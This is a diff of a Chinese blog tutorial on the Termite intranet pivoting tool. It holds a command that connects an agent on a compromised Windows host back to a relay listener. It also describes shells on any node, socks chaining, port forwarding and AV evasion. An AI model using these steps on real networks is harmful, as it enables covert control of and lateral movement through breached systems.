@@ -171,7 +171,7 @@
 <p>0x07 再此回到目标内网的win机器上执行<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">agent_Win32</span><span class="selector-class">.exe</span> <span class="selector-tag">-c</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.30</span> <span class="selector-tag">-p</span> 1235</div></pre></td></tr></table></figure></p>
 <p><img src="/img/win2008r2cn_agent.png" alt=""></p>
 <p>0x08 在本地win7cn上用admin端连接lnmp01机器上刚刚监听的端口,连接成功后会自动进入termite的内置终端,在终端中执行’help’即可看到所有选项用途,’show’一下就可清晰地看到当前agent的地图分布,比较简单,这里就不多啰嗦了<br><img src="/img/win7cn_admin.png" alt=""></p>
-<p>0x09 尝试在termite内置终端中切换到不同的agent节点,执行各种任务,如,最基本的文件上传下载[实战中文件尽量不要过大,另外,上传下载时务必注意下自己当前的节点位置],关于工具的基础用法就暂时先到这里了,还是那句话,大家可自行在实战中自行体会发掘<br><img src="/img/win7cn_admin_downfile.png" alt=""><br><img src="/img/win7cn_admin_uploadfile.png" alt=""></p>
+<p>0x09 尝试在termite内置终端中切换到不同的agent节点,执行各种任务,如,最基本的文件上传下载[实战中文件尽量不要过大,另外,上传下载时务必注意下自己当前的节点位置],任意节点弹shell,socks级联,端口转发等…关于工具的基础用法就暂时先到这里了,还是那句话,大家可自行在实战中自行体会发掘<br><img src="/img/win7cn_admin_downfile.png" alt=""><br><img src="/img/win7cn_admin_uploadfile.png" alt=""></p>
 <p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;总体来讲,程序让我觉得最赞的地方,还是agent节点随意切换,因为这样我们就可以非常灵活地穿透目标的多级内网纵深,也就是说,我们可以随意地goto到agent地图中的任意一个节点执行socks,说到这里,想必有经验的朋友,也差不多已经理解了,另外,程序本身的异常处理暂时做的还不太到位,免杀暂时还行,至于程序内部代码实现,本人也暂时还在学习中,不得不说,这确实是个非常不错的网络编程学习样本,没完,待续…</p>
 
     </div>
